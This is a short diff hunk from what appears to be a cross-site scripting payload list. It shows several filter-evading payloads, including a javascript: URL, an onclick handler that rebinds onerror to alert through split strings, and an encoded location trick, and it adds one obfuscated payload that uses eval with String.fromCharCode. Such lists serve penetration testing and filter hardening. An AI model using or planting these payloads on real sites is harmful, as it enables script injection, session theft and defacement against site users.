@@ -120,3 +120,4 @@ javascript:alert(1)//https://dqdqdqdqdq.myshopify.com
 ')*alert(1)*v.SS('.mp4
 <input accesskey=X onclick="self['wind'+'ow']['one'+'rror']=alert;throw 1337;">
 ?age=19;location=/javascript:alert%25281%2529/.source; :>
+with(String){eval(fromCharCode(97,108,101,114,116,40,49,41))}
